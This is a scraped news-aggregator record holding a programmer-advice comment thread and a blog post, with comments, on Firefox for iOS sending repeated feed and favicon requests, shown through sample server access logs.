Facebook sized solutions for a few thousand users. I’ve seen developers slowed to an absolute crawl, terrified of shipping code, for a completely secondary operational platform with low volumes and non-critical data. All because the product people were misguided in their mission. And sadly, I’ve seen teams with almost non-existent security practices and knowledge happily banging out crap in financial services environments. And I’ve been blessed with teams understanding their position and fully embracing it. Financial services products with quarterly releases that were rock solid and well architected. Batch document processing systems with just a few dozen end users who worked closely with us developers to tune algorithms where sometimes we would ship multiple times in a day and re run batches in production. To be successful, teams gotta know if you’re at NASA level, or life threatening, or business critical, or somewhat critical, or just nice tooling, plus understand the cash flow / budget situation. As a dev you may not be privy to all that, but strive to know as much of this as you can. And of course, understand who you users are, and who your customers are, and prioritize accordingly. reply trashburger 2 hours agoparentI am personally at the “nice tooling” level, but am currently building towards supporting other teams at the “business critical” level, so I try to apply the same rigour to everything that I do. It might make sense to also consider your dependents in similar scenarios. reply supriyo-biswas 4 hours agoprevI wish more articles talked about the usefulness of integration tests over unit tests. Personally, I feel that unit tests are overrated and rarely give the required confidence to inform the team whether something is ship ready, whereas integration tests on the common workflows means that even when a bug is introduced, very few users are affected. reply sethammons 2 hours agoparentSo much this. I have been at a few shops now that feel their integration tests are ok and their unit tests are proving >90% coverage and yet they break the login or auth flow weekly. An absolute aversion to e2e tests. As soon as I can make a test log in and create and read one record, and bake that into the release process (preferably gating merge to main and after deployment artifact generation) then the site no longer breaks every week. Customer pain and hours of dev work saved. reply valyala 4 hours agoprevMy advices to new software engineers: - Always think how to simplify the code you write, since simple code is easier to maintain and debug. - Prefer writing dumb code than smart code. Smart code is good for programming contests. Smart code is very bad in production when it needs to be debugged or refactored. - Always think about improving the usability of the software product you work on. Users don't care about code. They care about UX of your product. - Fix small usability issues as soon as you notice them, since these issues are usually the most annoying for end users. - Do not start writing code with some popular design patterns. Just write the most simple code, which resolves the given task. Later, the best design patterns will evolve organically from the code solving the particular task. VictoriaMetrics development goals are based on these rules - https://docs.victoriametrics.com/goals/ reply necrotic_comp 4 hours agoparentI go a step further on \"dumb code\". Write code that is easy to reason about, understand, and grok the implications of. I spent a ton of time doing support and engineering on a trading desk, where our SLA for an outage was somewhere in the range of 30 seconds to 5 minutes. Having super simple code that makes it easy to understand what the code problem is (if not necessarily the business problem) lets you move on with life and let the business keep moving. reply lukan 4 hours agoparentprevOr in short, KISS! (Keep it simple stupid!) And yes, users will notice the button that is only half visible quite a bit more, than a suboptimal sort algorithm. reply koliber 6 hours agoprevI rarely see advice with which I wholly agree. This is one of those rare times that I fully agree with everything g. Good seasoned advice from someone that has been doing this fo r a while. reply CM30 2 hours agoprevSeems like some good advice here! The points about digging deeper into the cause of a bug and looking at the history of the codebase for more info are really good points to keep in mind for sure. And remembering to ask questions hits home pretty well too. There's always the worry that you're bothering people too much, and the balancing act between thinking whether you need to be asking for help early enough to make sure you're not going down the wrong path and not asking about every little thing without attempting to fix it yourself... reply bazoom42 5 hours agoprev> Assess the trade-off you’re making between quality and pace Very important! But also important to distinguish between kinds of quality. Using a sub-optimal algorithm or bad identifiers or copy-pasted code can always be fixed later. But some problems like a bad database schema is much harder to fix later. reply megamalloc 5 hours agoprevMostly pretty sound advice here, but oh, this rankles! -- \"In situations where bugs aren’t mission critical (ex. 99% of web apps), you’re going to get further with shipping fast and fixing bugs fast, than taking the time to make sure you’re shipping pristine features on your first try.\" In 99% of web apps, your end users have no possible way of telling you that you shipped a bug, and your bug will remain there forever, frustrating users and losing your client money as they abandon your site. Telemetry won't help you either becuase you'll misunderstand the observations it provides. reply whatsakandr 4 hours agoprevA variant on that I say on one of these is \"Do the dumb thing\" thing to find the right abstraction. I've seen so mucb code that didn't need to be written if someone had just done the dumb thing. On the flip side, I've also seen so much code that could be so much simpler if after writing the dumb solution, they went back and figured out a better one. I guess the takeaway is: Prototype. reply stevenking86l 3 hours agoprevThis is one of the better advice posts I’ve seen. Especially the parts about finding the balance between shipping fast and shipping bug-free code. Too many engineers think their job is “great code writer” and not “value adder” reply vitus 4 hours agoprevThe point that resonated most with me, and that I repeat every time someone early in their career asks for advice (or one thing I wish I had been told when I first started out) is \"When working on a team, you should usually ask the question\". Early in my career, I spent a lot of time reading unclear or obsolete documentation, poring over code, etc, when I could have asked the person sitting next to me and gotten an answer in 5 minutes. Sometimes, I didn't even know who the right person to ask was, but if I had just asked my tech lead, he would have been able to point me in the right direction. Claiming that it reduces your overall time from several hours toSpending time sharpening the axe is almost always worth it I hear this advice constantly. But I feel like it really need to be qualified. I have been in projects that never saw any real value produced because people constantly focused on DX, projects management, and other tools. Sometimes one just needs to do with tools at hand, and not worry if there are better tools. reply anilakar 2 hours agoprevOne more: Make developer velocity one of your top priorities. You should be able to give anyone in your team the repo URL and have them running unit and local integration tests in five minutes without prior knowledge. reply liampulles 4 hours agoprev\"Bad code gives you feedback, perfect code doesn’t. Err on the side of writing bad code\". This is probably quite a cynical way of putting it (and it speaks to me, probably because I am quite cynical) though I don't know if a junior dev will really appreciate this. The way I would put it is: don't seek satisfaction from trying to make perfect abstractions for business rules no one quite understands, rather seek satisfaction from making your user's lives easier as efficiently as possible. reply myaccountonhn 5 hours agoprevThis is interesting. If I were to complement the list, these are some items I’d add that helped me: - learn functional programming. Doing that was how I finally “grokked” programming and could solve problems more easily. Before I was ready to give up. - learn CS history. I studied UX and what I learnt was mostly one side of how to think about computing where you spoon feed users and remove things. There are other ways to conceptualize software and design, which would have left me less disillusioned. - learn fundamentals: data structures, networking, performance, operating systems, security, unix, math. These are so neglected in the industry, and we’re left with super complex systems we don’t actually understand as a result. reply bloopernova 3 hours agoparent\"learn fundamentals: data structures, networking, performance, operating systems, security, unix, math. These are so neglected in the industry, and we’re left with super complex systems we don’t actually understand as a result.\" I sometimes hold a \"command line fundamentals\" course for my teams. Just being able to understand the basics puts them above any team that doesn't. You have to know the ground you're building on. Otherwise even your foundation will be faulty. reply trashburger 2 hours agorootparentCould you please share an itinerary for this? I’d also like to hold a similar course but don’t know where to start. reply bloopernova 1 hour agorootparentSure thing! This assumes everyone has macOS, but isn't very mac-specific. * Introduction Quick history of Unix * When you log in Difference between login and interactive shells System shell files vs user shell files .zshenv for environment variables like PATH, EDITOR, and PAGER .zprofile for login shells, we don't use it .zshrc for interactive shells Your login files are scripts, and can have anything in them * Moving Around ** Where am I? pwd = \"print working directory\" stored in variable $PWD Confusingly, also called current working directory, so you may see CWD or cwd mentioned ** What is here? ls ls -al ls -alt . prefix to filenames makes them hidden . is also the current directory! .. means the parent directory ** Finding my way around cd cd - dirssed -e $'s/ /\\\\/g' ** Getting Help From The Man man 1 zshbuiltins manpage sections ** PATH echo $PATHsed -e $'s/:/\\\\/g' zshenv PATH setting ** Environment Variables envsort EDITOR variable ** History ctrl-r vs up arrow ** Permissions Making something executable ** Prompts zsh promptinit zsh prompt -l ** Pipes Iterate to show how pipes work cat ~/.zshrcgrep PATH ** Commands *** BSD vs GNU commands BSD are supplied by Apple, and Apple often uses old versions GNU are installed via homebrew, and match those commands available in Linux reply DanielVZ 5 hours agoprevI have one: Learn to become comfortable implementing and working on state machines. It might be one of the most useful abstractions out there that if implemented well leads to a great extensible design without compromising performance. reply Anduia 2 hours agoprevFunny how he casually mentions JIRA as a process that slows you down. I get that his team does the issue tracking somewhere else? What does people use that is faster to process both for devs and the PM? reply marcusbuffett 23 minutes agoparentThat was more of a subtle joke than anything substantive. I think JIRA is probably fine as long as it’s not like a religion reply skydhash 2 hours agoparentprevIt always depends on the team. And by team, I mean the people working on a somewhat independent part of the project (they don’t need to care about the minutia of some other parts). Issue tracking is a tool, but project managers always wants the tool to become the process. And that’s when you got daily standups, story points, epics, and fixed sprints (aka fake deadlines). Use the tool as a tool. As the devs, add issue and tasks that needs the attention of the team, comments on a ticket for knowledge retention. As the manager, schedule the ticket if its completion matters in a particular timeframe, use assignments and other fields to manage workload. Do all of these to help the team get things done. Anything else is a hindrance. reply Anduia 1 hour agorootparentCorrect, but JIRA is not SCRUM. Why does the author mention JIRA as a process? Does he find it slow or convoluted compared to other tools? Or does he think that using JIRA means a PM is forcing the team to follow an unwanted process? reply theideaofcoffee 5 hours agoprev> If you (or your team) are shooting yourselves in the foot constantly, fix the gun This is a reasonable step to take if you're working in a reasonable company with reasonable \"management\". If you're unlucky enough to be working under a manager that refuses to recognize there is a problem, even with compelling data, prepare for pain. In that case nothing is allowed to be done because \"well, that's how we've always done it and doing something about it might upset someone\". It's really time to quit and find something new at that point because there is generally no hope of turning that around. > If you can’t easily explain why something is difficult, then it’s incidental complexity, which is probably worth addressing See above. \"That's how we've always done it, and someone is used to that work flow, so we can't change it.\" Sometimes this will lead to a legitimate Chesterton's Fence situation, in which case you'd want to regroup and rethink it. Otherwise, the batshit insane is the default. Target the latter. > Try to solve bugs one layer deeper \"There is no time to do that! We have so many other projects!\" While being blind to the fact (or better yet, burying their head in the sand and trying to ignore) that it's all self-induced. > Don’t underestimate the value of digging into history to investigate some bugs \"We can't change that because one of our people close to management made that decision and it might drive them away.\" Good, get them out, that's the only way to really fix it. Ideally if the management that hired them is pushed out too. > When working on a team, you should usually ask the question \"Who are you to question our wisdom? Who are you to suggest something else, it's working in production.\" These are great things to start conversations, but you have to start them in an organization that is willing to change and be willing to take your advice to heart. Don't waste your precious life trying to change what can't be change, no matter how much you want to see it change. reply inatreecrown2 5 hours agoprevthis is not on the content but on the website color choices for text and background: wonderfully well done, easy to read in dark mode. with this kind of sensible coloring i feel i don’t need eink devices for reading. reply l2dy 5 hours agoprev> Keep doing the first sort of bug fix, and you end up with a mess. To avoid the mess, design with the fail-fast principle in mind, which brings you closer to the spot where an error occurred. reply metalrain 5 hours agoprevVery reasonable, solving bugs one layer deeper can be very valuable, if you don't go too deep into the rabbit hole. reply redevil 1 hour agoprev> For the backend of Chessbook I have a command to copy all of a user’s data down to local, so I can reproduce issues easily with only a username hmmmmmm reply efitz 4 hours agoprevI loved the author's point on \"incidental complexity\". I would point out though, that even if you CAN explain why something is complex doesn't mean it SHOULD be complex. When the subject of \"tech debt\" comes up, I always tell the teams I work on to focus on tasks that improve our speed or agility in the future. I believe that many coding tasks actually have a negative dev cost over time, as they reduce the dev costs of future work more than they cost at the current moment to implement. (Of course the problem is that they have a positive dev cost in the current sprint, so good luck convincing decision makers...) reply brainzap 5 hours agoprevprogramming is such a young field wirh many iterations that good advice is hard. I should have probaly made my own programming language! reply mrits 4 hours agoprevI spent a ridiculous amount of hours tweaking my vim config over the last two decades. I've used vscode the last few years and rarely jump to vim to do some text manipulation (that I usually could do with a raw install) reply yowlingcat 2 hours agoprevAgree with sibling comment saying these are too abstract. Here are mine: Fundamentals: - Ecosystem beats language and syntax - Use boring, battle tested technologies - Use the relational database to do the heavy lifting - Avoid caching unless you have a great reason - Code cleanliness comes from simplicity, not elegance - There's higher leverage from improved code reading ability over writing ability Professional: - You grow faster building in good industries over interesting codebases - There's higher leverage from improving the business over improving the code - There's higher leverage in finding mentorship over being an autodidact - Make T-shaped buy vs build calls: build the secret sauce, try to buy the rest Probably leaving a bunch out. reply jakobov 5 hours agoprevCodeisforhumans.com reply photochemsyn 4 hours agoprev> \"It’s really easy to write terrible code. But it’s also really easy to write code that follows absolutely every best practice, with 100% test coverage, and has been fuzz-tested and mutation-tested for good measure – your startup will just run out of money before you finish. So a lot of programming is figuring out the balance.\" The situation appears to be changing rapidly. 15 years ago there were no advanced code-generating LLMs, and while relying on them for the core logic without having a good understanding of the language and system is still a bit iffy, it does seem that they're pretty good for generating tests and spotting deviations from whatever your group has decided are best practices. reply farmeroy 4 hours agoparentWhat sort of tests does it seem good at generating? I was hoping it would give me a decent start writing tests with Jest and React Testing Library for an already existing but untested codebase. It seemed ok at small components that I can also quickly write tests for, but the larger, messier things would receive useless, failing tests. reply pharmacy7766 5 hours agoprev [–] What about: buy Bitcoin? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Fix recurring issues by addressing root causes, such as ensuring UI updates in iOS development happen on the main thread to avoid crashes.",
      "Balance quality and speed based on the environment; prioritize speed in less critical settings and correctness in high-stakes scenarios.",
      "Sharpen your tools by becoming proficient with your editor, OS, shell, and browser dev tools to significantly boost productivity."
    ],
    "commentSummary": [
      "Key advice for programmers includes not taking work personally, understanding the business context, and focusing on problem-solving rather than just technical issues.",
      "Emphasis on practical tips such as simplifying code, prioritizing developer velocity, and balancing between shipping fast and maintaining code quality.",
      "Encouragement to learn functional programming, understand state machines, and make informed decisions on when to build versus buy solutions."
    ],
    "points": 284,
    "commentCount": 176,
    "retryCount": 0,
    "time": 1719661081
  },
  {
    "id": 40828203,
    "title": "How to waste bandwidth, battery power, and annoy sysadmins",
    "originLink": "https://rachelbythebay.com/w/2024/06/28/fxios/",
    "originBody": "Writing Software, technology, sysadmin war stories, and more. Friday, June 28, 2024 How to waste bandwidth, battery power, and annoy sysadmins Okay, let's talk about something other than feed readers for a moment. How about completely broken web browsers? Yeah, those. This. This is a thing. Count the broken: ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:26 -0700] \"GET /w/css/main.css HTTP/1.1\" 200 1651 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/feed.png HTTP/1.1\" 200 689 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed/ HTTP/1.1\" 200 8052 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 ip - - [28/Jun/2024:14:44:27 -0700] \"GET /w/2024/05/27/feed//favicon.ico HTTP/1.1\" 404 20 First up, why in the hell do you need to request the same link 12 times? No, scratch that, 15 times, since it does 3 more after getting the css and feed icon. Then it goes for the favicon, and what clown decided that the right way to request \"/favicon.ico\" is to prepend the base path to it? This cursed thing that Microsoft foisted upon us back in the 90s is supposed to be at the top level. It's not part of individual directories. That would be stupid. And yet, this thing decides to beat the shit out of the web server while trying to get it. I used to wonder just what could be this stupid. The user-agents on these bad requests aren't particularly helpful. But, then one day, I got lucky and noticed that the first request of the set has one very interesting little detail in it (while the others do not): FxiOS/127.1 FxiOS. That is, Firefox for iOS. That by itself was enough to get me looking, and oh, look what I found. Request spamming when visiting a site Request spam for favicon and apple-touch icons on iOS 16 + Firefox 105 Request Flooding when opening app favicon.ico is in / , it looks for favicon.ico in every directory except / . Firefox on iPhone makes a flood of requests for icons Lovely. So, if you're using this garbage, know that you're probably leaving a trail of badness in your wake. More writingContact / send feedback",
    "commentLink": "https://news.ycombinator.com/item?id=40828203",
    "commentBody": "How to waste bandwidth, battery power, and annoy sysadmins (rachelbythebay.com)253 points by zoidb 12 hours agohidepastfavorite126 comments Aardwolf 8 hours agoI thought firefox on ios was just safari with a reskin because apple doesn't allow other browser engines on their phone? Firefox on android is amazing with its plugin support, though I still prefer their pre-2021 UI reply loufe 8 hours agoparentGiven the seriously negative sibling comments, I thought I'd weigh in with my own experience. I'm unaware of anything behind the scenes, but I've always enjoyed the user experience in Firefox on Android, at least for the last couple years before the rewrite. I don't like browsing the web on my phone, but it's made it bearable. I can't speak to the problems behind the scenes though, and they certainly merit attention. reply sirn 4 hours agoparentpreviOS requires a browser to use the OS-provided WebKit, but you can still use your own networking layer, and doing your own scripts injection (e.g. for extensions, like what Orion is doing). Firefox for iOS used to use Alamofire as its networking engine, but switched over to NSURLSession/URLSession at some point. Chrome for iOS uses Cronet which was extracted from Chromium's networking stack (or maybe used, I have not followed the development recently). reply nanidin 58 minutes agorootparentiOS allows third party browser engines since iOS 17.4 in the EU. reply tgv 8 hours agoparentprev> I thought firefox on ios was just safari with a reskin It is. It does avoid some of the tracking/ad content, so I guess it does do some things somewhat differently. But if it's such a scourge, add a favicon. BTW, I've never seen this, and I regularly use Firefox on iOS to test. reply smolder 8 hours agoparentprevFirefox on Android is NOT amazing. For MANY YEARS the user agent included the exact model of your phone. They seem to be incompetent. (Edit: this is a bit harsh, and to clarify, directed at the company and not any specific people in their employ.) Exactly what Google wants -- plausible deniability when it comes to monopoly, but an awful alternative. reply bu7jjuj 8 hours agorootparentFirefox on android can run ublock origin. The internet is unusable on mobile otherwise. But go on and let google continue to 'wow'you with their amazing ad tech. Firefox on android IS AMAZING. reply SoftTalker 3 hours agorootparentAbsolutely. I was an Android user for years and got an iPhone as a gift in 2022. On Android, I used Firefox with uBlock Origin. Mobile web browsing is not the best experience regardless, but that made it tolerable. The worst thing about the iPhone is the web browsing experience in Safari. It's awful. The ads totally ruin it. The rest of the phone is fine, I still prefer Android but that's most likely just because it's what I started with. reply maeil 7 hours agorootparentprevThere's Brave on Android fwiw. reply theshrike79 6 hours agorootparentBrave is still just a fancy Chromium reskin, I'll use any other engine than Chrome if it's even remotely possible reply bigstrat2003 4 hours agorootparentThat's fine, but that is moving the goalposts. GP said that Firefox is so good on Android because it's important to have ad blocking, and Brave meets that need just fine. reply staplers 4 hours agorootparentprevBrave has similar anti-privacy/adtech built in They even market it: https://brave.com/brave-ads/ reply sunaookami 8 hours agorootparentprevNo it's not. It's slow and buggy. You can also use an adblocking DNS like AdGuard and have adblocking system-wide. Yes I know uBlock blocks a bit better but DNS-blocking suffices. Also, there are other browsers with integrated adblockers based on Chromium. reply viraptor 7 hours agorootparentIt's not \"a bit\" better. uBlock can tell a difference between seeing an ad from network X and going to the website of network X. It can block ads hosted by the owner. It can allow you to click a tracking link from an email while still blocking ads on the target website. Finally you can unblock something as a one-off without disabling the system for the whole device/network. The quality difference is huge. reply erinaceousjones 7 hours agorootparentprevNot ever had Firefox for android be slow and buggy for myself! I've been using it in place of chrome on my phone for a good year. Honestly everyone keeps talking about how FF is \"slow and buggy\" and it has NEVER given me issue :/ why is my subjective experience so different to your subjective experience? Meanwhile chrome/chromium is the one which is most likely to cause me GPU driver crashes, but that's because I use it for fun VR and \"let's see how big I can make textures\" experiments. Generally it manages a higher frame rate than FF in that context with stability as tradeoff. reply pohuing 7 hours agorootparentThere could just be a difference in hardware. I'm a Firefox user but there is a noticeable difference, just not one that matters much on a top tier soc reply jakub_g 7 hours agorootparentLoading JS heavy pages like Twitter on Firefox Android is way slower than Chromium based. Very noticeable on 2019 hardware, less so but still on 2022 hardware. reply erinaceousjones 7 hours agorootparentAh, fair point. I'm on a pixel 6, so I have a privileged perspective that like 90% of smartphone browser users don't have because fairly new and fast SoC with a good amount of memory. I hadn't considered how much a difference that makes, because conceptually in my head \"it's just webpages!\" like we're still in the early 2000's reply sierisimo 1 hour agorootparentprevBut is completely Firefox fault? Some companies just test compatibility and optimize with Chrome in mind, forgetting that sometimes some browsers (Firefox as well) dont respect some standards. Or even adding some features only available in some browsers. Yes, is not as bad as it was in the 90s or 2000s, but is still a common issue reply cduzz 3 hours agorootparentprevWhat's the user visible tradeoff between \"an average page is so laden with advertising and tracking nonsense that it loads slowly and is covered with crap, but that crap all renders real fast\" vs \"JS renders at 1/10th the speed but only the stuff you want to look at?\" reply onli 6 hours agorootparentprevThat hasn't been my experience at all. It was Firefox that made web browsing bearable again on my old android device. reply carlob 6 hours agorootparentprevHonestly Twitter has become a downright hostile browsing experience on any browser and any hardware. It's probably on purpose to make you use the app. reply thequux 6 hours agorootparentprevI use Firefox on a ~2020 era Android, and not even a particularly great one at that. Works fine for me aside from a very few badly written sites, and certainly not any shower than chrome. reply technofiend 7 hours agorootparentprevublock makes sites like imgur usable. it's trivial to add a nice rule that deletes all those login via social media buttons just as one example of what the hosts file can't do. reply mattmanser 7 hours agorootparentprevYou've been downvoted but I would like to echo this comment. I use Firefox mobile daily, I occasionally have to switch to Chrome for some things. I choose to continue using Firefox Android because of the ability for greater privacy. Firefox android is slow and buggy. It is especially terrible if you are not in the habit of closing open tabs and just open new ones. As a concrete example, it often seems to run out of memory, causing issues such as Reddit not being able to load videos. They tried to fix this by more aggressively moving older tabs to an 'inactive' tab area, but it didn't work. It at least feels badly written, saying that as an experienced developer myself. However, I know browsers are one of the hardest things to make, so perhaps it is just averagely written. But it is nowhere near Chrome's level of competence. The new UI is awful too, I still hate a lot of design decisions and feel it was a bad mis-step. The old UI was just better. Again, I emphasise I use the browser daily and I say this with plenty of time to get used to it. reply oldmariner 7 hours agorootparent> It is especially terrible if you are not in the habit of closing open tabs and just open new ones. I just closed a bit over 2,000 tabs on my old phone because I was switching phones. I recall reading a couple of other comments here in HN and seeing a couple of comments in reddit of other people having thousands of tabs open. Slow and buggy has NOT been my experience. I use uBlock Origin addon though, maybe that's the difference? I bet resource-hogging ads could be an issue. Edit: I also had \"studies\" turned off. Perhaps you were in a study that was testing something that caused those issues? (That's why I don't like default \"studies\" or A/B testing.). Or maybe something else (physical or software) on your phone is damaged/defective, perhaps even your installation of the Firefox app got borked? reply sunaookami 3 hours agorootparentprevIt's just par for the course for Firefox users to deny any problems with the browser and blame it all on Google. Not to mention the history revisionism on why Chrome beat Firefox. I was a huge Firefox fan with a heavily customized browser and then Mozilla removed everything. The biggest enemy of Firefox is not Google, it's Mozilla and their incompetent leadership. They need to focus on their Android browser ans invest heavily because that's where the biggest user base is. I don't want them to abandon Gecko, but it's clear that Mozilla can't keep up. reply phartenfeller 8 hours agorootparentprevNope, for me it includes the Android version but no device model information. reply smolder 8 hours agorootparentThey fixed it after the issue was present for MANY YEARS, exactly as stated. reply cuu508 7 hours agorootparentOK, so it was NOT amazing for MANY YEARS, but now it is ;-) reply Aachen 8 hours agorootparentprevThe other day I found out my mobile user agent string also included the kernel build version. Way to see which, if any, exploit would be effective for the device's patch level. Thankfully it has a spoof option so I now use that to send a correct, but slightly stripped, UA string I keep thinking I should switch to Firefox but the current ux is just so comfortable reply vorticalbox 8 hours agorootparentprevThere is also this issue To address this, we will measure Telemetry Coverage, which is the percentage of all Firefox users who report telemetry. The Telemetry Coverage measurement will sample a portion of all Firefox clients and report whether telemetry is enabled. This measurement will not include a client identifier and will not be associated with our standard telemetry. Even if you turn telemetry off it will still call home https://blog.mozilla.org/data/2018/08/20/effectively-measuri... reply Ylpertnodi 6 hours agorootparentprev>...directed at the company and not any specific people in their employ. They are the same thing, until you get to the upper levels, that own the place ie 'take full responsibility'. We are fa-mily. Until the shit hits the fan. reply Twirrim 5 hours agoparentprevI'm another who loves firefox on android. It annoys me that to some degree Android forces chrome on you, even if firefox is set as your default. The full plugin support that got added in the last year really took it up a notch too. reply chithanh 8 hours agoparentprevFirefox on Android is not amazing, it is on the contrary quite annoying and has gotten more so over the years * Tabs get stuck frequently, and can only be revived by closing, then undoing close. * Can no longer access about:config in release builds * Bookmarks got demoted in favor of Pocket, can no longer set bookmarks as default home page * URL autocompletion got dumbed down, first on mobile and then also on desktop * etc. reply erinaceousjones 7 hours agorootparentMy experience with Firefox Nightly for ~1 year below. Ironically, the nightly sounds more consistently stable than the current release build then!: * Never had this tabs problem * I can see about:config * Bookmarks are fine and there's no mention of Pocket. Bookmarks show up ON the homepage, but yeah not being able to set a bookmark / any URL AS a homepage is a bit of an annoying feature lack * URL completion works as I expect it to, although it does bug me how it strips the protocol from the URL so I have to manually type in `http://` for plaintext sites even when I've visited them before; depending on who you ask that is considered a \"security feature\" but kinda annoying. Other than that, I start typing in a URL and it shows me suggestions from my history followed by option to use my preferred search engine to search it. All in all, I've not really felt FF (even nightly) be particularly different or unstable to using chrome. Second comment I've made in this thread where I'm replying (ever so helpfully) \"Huh, but it works for me\" so I'll stop now :-). I promise the Mozilla Foundation aren't bribing nor blackmailing me. reply oldmariner 7 hours agorootparentI don't remember seeing Pocket, so I went back to the settings to look. There's an option to have \"Thought-provoking stories\" which in smaller text says \"Powered by Pocket\". Considering I didn't even realize it said Pocket the first time around, I think bookmarks are more prominent over Pocket, so I don't see bookmarks being demoted in favor of Pocket. reply csande17 6 hours agorootparentFor a while, bookmarks were demoted in favor of Collections, a jankier version of bookmarks that didn't sync properly to desktop and included a button to open all of them at once in multiple tabs. Collections are still there, but they've made it easier to use regular bookmarks too, so now Firefox for Android just has two versions of bookmarks in it for some reason. Entirely unrelated to Pocket, as far as I know, except in the general sense of Mozilla having bad ideas related to bookmarks. reply jgalt212 6 hours agorootparentprevPocket is the worst. It tried to get me to read some article where the author was whinging that her daughter was pretty and people were complementing her as such. https://time.com/6990734/ugly-side-of-pretty-essay/ reply Geezus_42 3 hours agorootparentYou clearly did not understand that woman's point. reply ndriscoll 1 hour agorootparentI don't understand her point. I guess that she's uncomfortable with human aesthetics? Why would being pretty require sacrifices in health and self-respect? One of the largest factors in looking good is being in good shape/physically healthy. Avoiding skin damage from UV is also a big one. Why would you lose self-respect for looking good? reply butterNaN 7 hours agoparentprevFirefox on Android is a godsend to me, and the secret is that I can install uBlock origin and noscript on my mobile. I get a whiplash when I see someone else browsing the web without these, it is absurd how much attention people will allow to be just stolen away. reply seism 12 hours agoprevIt's an open source project, with a good discussion of the technical issues on GitHub[1]. Probably linked to certain user behaviors, like having hundreds of tabs open, but surely also contingent on the complexity of wedging a browser in iOS. Like maneuvering an excavator into a sandbox. [1] https://github.com/mozilla-mobile/firefox-ios/issues/12113 reply yosefk 10 hours agoparentI also wonder how these requests \"beat the shit out of the web server.\" It's requesting the feed and the favicon, both of which could be cached by a CDN. Even if they aren't, how much traffic are you gonna see from this compared to some other page trending on HN? Wasteful, sure, but hardly that big a deal reply smolder 8 hours agorootparent> Wasteful, sure, but hardly that big a deal This attitude is why so much software is garbage, and why people with limited connections or hardware can't have a good time on the internet. reply yosefk 8 hours agorootparentIn this case, using a CDN in front of the server is the thing which would improve things for people with limited bw/hw more quickly and to a greater extent than counting the fetches by Firefox on iOS and calling it out for fetching too much reply theshrike79 6 hours agorootparentBut if clients were considerate, we wouldn't need to waste electricity and work hours to run CDNs? reply yosefk 4 hours agorootparentYou would want a CDN anyway to cache data across users, on servers close to those users, cutting the time & energy spent to serve the data. reply EdwardDiego 10 hours agorootparentprevWhy should you need to provision a CDN when If-Modified-Since / Etags exist? I get that not every client is well behaved, but you'd hope that Firefox would be, given Mozilla's presence in web standards. (Which, tbh makes me think this issue is the \"on iOS\" bit, given it's Firefox. I presume Apple still has their \"only Safari's rendering engine\" rule in place for... ...reasons) reply yosefk 9 hours agorootparentA CDN caches across users, lowers latency by having servers closer to the user, and lowers the bandwidth your server needs to handle. Cloudflare CDN has a free tier and I assume others do, too, so it's fairly easy to provision. reply mcculley 8 hours agorootparentprevWhy would the issue be “on iOS”? The renderer has nothing to do with how pages are fetched. reply jampekka 8 hours agorootparentThey probably have to write a totally different fetching logic for the Safari wrapper. If Apple wasn't as scummy as they are, they would have used the same logic as in other platforms where this problem doesn't seem to exist. reply tristan9 3 hours agorootparentprevBad take. I opened the Github issue linked. For us it represented, at times, thousands of requests per second across multiple users. And that was with affected users getting IP-banned temporarily. Some of which were 404s which you typically absolutely do not want cached. Or 405s (on HEAD /favicon.ico for example). Or 429s. Or 